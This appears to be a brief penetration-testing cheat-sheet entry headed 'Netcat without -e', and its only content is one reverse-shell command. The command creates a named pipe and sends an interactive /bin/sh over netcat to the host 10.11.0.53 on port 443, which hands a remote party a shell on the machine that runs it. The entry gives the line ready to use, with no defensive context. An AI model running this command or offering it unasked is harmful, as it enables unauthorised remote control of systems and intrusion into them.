# Netcat

#### **Netcat without -e \#1**

```text
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.11.0.53 443 > /tmp/f
```

